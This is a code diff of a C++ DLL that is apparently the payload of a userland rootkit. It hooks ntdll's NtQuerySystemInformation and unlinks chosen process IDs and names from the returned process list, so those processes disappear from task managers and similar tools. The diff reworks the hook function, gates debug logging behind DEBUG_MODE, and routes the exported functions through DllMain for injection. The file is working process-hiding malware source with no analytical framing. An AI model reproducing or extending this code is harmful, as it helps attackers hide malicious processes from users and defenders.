@@ -6,12 +6,13 @@
 #include "Payload.h"
 
 #include "../NtHookEngine/NtHookEngine.h"
-/*
+#ifdef DEBUG_MODE
 #include <iostream>
 #include <fstream>
 #include <iomanip>
 #include <string>
-*/
+
+#endif
 
 #include <wchar.h>
 #include <Windows.h>
@@ -19,34 +20,8 @@
 
 using namespace std;
 
-int *hiddenPIDsList;
-TCHAR **hiddenProcessNames;
-int PIDsNum, procNameNum;
-bool isUp = false;
-
-
-PNtQueryFunc RealNTQueryFunc,OrigAddress;
-
-
-
-HANDLE hMutex;
-extern "C" __declspec(dllexport) wchar_t* WStringFunc()
-{
-	InitializeDLL();
-	return NULL;
-
-}
-
-extern "C" __declspec(dllexport) char* StringFunc()
-{
-	InitializeDLL();
-	return NULL;
-}
-extern "C" __declspec(dllexport) void VoidFunc(){
-	InitializeDLL();
-}
-
-/*void PrintToFile(const char* s) //just for debugging purposes
+#ifdef DEBUG_MODE
+void PrintToFile(const char* s) //just for debugging purposes
 {
 	wofstream f;
 	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
@@ -59,7 +34,47 @@ void PrintToFile(const TCHAR* s)
 	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
 	f << s << endl;
 	f.close();
-}*/
+}
+#endif
+int *hiddenPIDsList;
+TCHAR **hiddenProcessNames;
+int PIDsNum, procNameNum;
+bool isUp = false;
+
+
+PNtQueryFunc RealNTQueryFunc,OrigAddress;
+
+
+
+HANDLE hMutex;
+
+HMODULE GetCurrentModule()
+{ // NB: XP+ solution!
+	HMODULE hModule = NULL;
+	GetModuleHandleEx(
+		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
+		(LPCTSTR)GetCurrentModule,
+		&hModule);
+
+	return hModule;
+}
+extern "C" __declspec(dllexport) wchar_t* WStringFunc()
+{
+	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
+	return NULL;
+
+}
+
+extern "C" __declspec(dllexport) char* StringFunc()
+{
+	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
+	return NULL;
+}
+extern "C" __declspec(dllexport) void VoidFunc(){
+	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
+}
+
+
 
 BOOL wstrcmp_ignorecase(LPCWSTR a, LPCWSTR b) //easier to implement than use existing functions
 {
@@ -81,11 +96,21 @@ BOOL isHiddenProcess(int pID, const TCHAR *name)
 {
 	for (int i = 0; i < PIDsNum; i++)
 	{
+		#ifdef DEBUG_MODE
+		PrintToFile("Checking PID: ");
+		char buff[10];
+		sprintf_s(buff, 10, "%d", hiddenPIDsList[i]);
+		PrintToFile(buff);
+#endif
 		if (hiddenPIDsList[i] == pID)
 			return TRUE;
 	}
 	for (int i = 0; i < procNameNum; i++)
 	{
+#ifdef DEBUG_MODE
+		PrintToFile("Checking Name:");
+		PrintToFile(hiddenProcessNames[i]);
+#endif
 		if (!wstrcmp_ignorecase(name, hiddenProcessNames[i]))
 			return TRUE;
 	}
@@ -98,66 +123,52 @@ PSYSTEM_PROCESS_INFO getNextElement(PSYSTEM_PROCESS_INFO spi)
 	return (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset);
 }
 
-NTSTATUS fakeNTQuery(SYSTEM_INFORMATION_CLASS info_class, PVOID sys_info, ULONG info_length, PULONG return_length)
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	__inout    PVOID                    SystemInformation,
+	__in       ULONG                    SystemInformationLength,
+	__out_opt  PULONG                   ReturnLength
+)
 {
-	//PrintToFile("Intercepted call!");
-	if (info_class != SystemProcessInformation)
+	NTSTATUS status = RealNTQueryFunc(SystemInformationClass,
+		SystemInformation,
+		SystemInformationLength,
+		ReturnLength);
+
+	if (SystemProcessInformation == SystemInformationClass && NT_SUCCESS(status))
 	{
-		if (RealNTQueryFunc != NULL)
+		//
+		// Loop through the list of processes
+		//
+
+		PSYSTEM_PROCESS_INFO pCurrent = NULL;
+		PSYSTEM_PROCESS_INFO pNext = (PSYSTEM_PROCESS_INFO)SystemInformation;
+
+		do
 		{
-			return RealNTQueryFunc(info_class, sys_info, info_length, return_length);
-		}
-		else
-		{
-			return -1;
-		}
-	}
-	else
-	{
-		WaitForSingleObject(hMutex, INFINITE); //not sure that NtQuerySystemINformation is thread-safe, so use mutex to protect
-		if (RealNTQueryFunc != NULL)
-		{
-			PSYSTEM_PROCESS_INFO prev_spi = NULL, spi = (PSYSTEM_PROCESS_INFO)sys_info;
-			NTSTATUS x = RealNTQueryFunc(info_class, spi, info_length, return_length); //Get Process List
-			if (spi == NULL)
+			pCurrent = pNext;
+			pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
+
+			if (isHiddenProcess((int)pNext->ProcessId,pNext->ImageName.Buffer))
 			{
-				ReleaseMutex(hMutex);
-				return x;
-			}
-			while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
-			{
-				if (spi->ProcessId != 0)
+				if (0 == pNext->NextEntryOffset)
 				{
-					if (isHiddenProcess((int)spi->ProcessId, spi->ImageName.Buffer))
-					{
-						if (prev_spi == NULL) //first process in list
-						{
-							sys_info = getNextElement(spi); //override first element
-						}
-						else
-						{
-							prev_spi->NextEntryOffset = (prev_spi->NextEntryOffset + spi->NextEntryOffset); //make previous element hide this one
-						}
-						//if (return_length != NULL) //TODO: research how to treat the return length correctly
-						//	*return_length -= spi->NextEntryOffset;
-					}
-					else //boring process
-					{
-						prev_spi = spi;
-					}
+					pCurrent->NextEntryOffset = 0;
 				}
-				spi = getNextElement(spi); // Calculate the address of the next entry.
+				else
+				{
+					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+				}
+
+				pNext = pCurrent;
 			}
-			ReleaseMutex(hMutex);
-			return x;
-		}
-		else
-		{
-			ReleaseMutex(hMutex);
-			return -1;
-		}
+		} while (pCurrent->NextEntryOffset != 0);
 	}
+
+	return status;
 }
+
+
 int buildPIDsList(const TCHAR *optarg, BOOL includeSelf, int **intBuffer)
 {
 	//returned value - number of PIDs in list
@@ -219,36 +230,42 @@ int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuff
 
 }
 
-void InitializeDLL()
+void InitializeDLL(pArgStruct args)
 {
 	NtHookEngineInit();
 	hMutex = CreateMutex(0, TRUE, NULL);
-	TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE];// , hookEngLoc[MAX_PATH];
-	FILE *fp;
-	fopen_s(&fp, INFO_TRANSFER_FILE, "r");
-	fgetws(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide
-	fgetws(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide
-	//fgetws(hookEngLoc, MAX_LINE, fp); //third line - location of the Hook Engine DLL
-	pIDsbuff[wcslen(pIDsbuff) - 1] = '\0'; //delete \n
-	procNameBuff[wcslen(procNameBuff) - 1] = '\0';
-	//hookEngLoc[wcslen(hookEngLoc) - 1] = '\0';
-	fclose(fp);
-	PIDsNum = buildPIDsList(pIDsbuff, FALSE, &hiddenPIDsList);
-	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
-	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
-	//HMODULE hHookEngineDll = LoadLibrary(hookEngLoc);
-
+	if (args == NULL)
+	{
+		ReleaseMutex(hMutex);
+		return;
+	}
+	else
+	{
+		procNameNum = buildProcNameList(args->procNames, FALSE, &hiddenProcessNames);
+		PIDsNum = args->pIDsNum;
+		int hiddenPIDsListSize = sizeof(int)*PIDsNum;
+		hiddenPIDsList = (int *)malloc(hiddenPIDsListSize);
+		memcpy_s(hiddenPIDsList, hiddenPIDsListSize, args->pIDs, sizeof(int)*args->pIDsNum);
+		#ifdef DEBUG_MODE
+			PrintToFile("Line:");
+			for (int i = 0; i < procNameNum; i++)
+				PrintToFile(hiddenProcessNames[i]);
+			PrintToFile("PIDs:");
+			for (int i = 0; i < args->pIDsNum; i++)
+			{
+				char intbuf[10];
+				_itoa_s(hiddenPIDsList[i], intbuf, 10, 10);
+				PrintToFile(intbuf);
+			}
+		#endif // DEBUG_MODE
+	}
 	OrigAddress = (PNtQueryFunc)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
-	/*if (OrigAddress == NULL)
-		PrintToFile("Can't get original!");
-	PrintToFile("Pre-Hook");*/
-	BOOL hookres = HookFunction((ULONG_PTR)OrigAddress, (ULONG_PTR)&fakeNTQuery);
-	/*if (!hookres)
-		PrintToFile("Can't Hook");*/
-	RealNTQueryFunc = (PNtQueryFunc)GetOriginalFunction((ULONG_PTR)fakeNTQuery);
-	/*if (RealNTQueryFunc == NULL)
-		PrintToFile("Can't get Real Func!");
-	PrintToFile("Post-Hook");*/
+	BOOL hookres = HookFunction((ULONG_PTR)OrigAddress, (ULONG_PTR)&HookedNtQuerySystemInformation);
+	#ifdef DEBUG_MODE
+		if (!hookres)
+			PrintToFile("Hook Failed!");
+	#endif
+	RealNTQueryFunc = (PNtQueryFunc)GetOriginalFunction((ULONG_PTR)HookedNtQuerySystemInformation);
 	ReleaseMutex(hMutex);
 }
 void UnhookDLL()
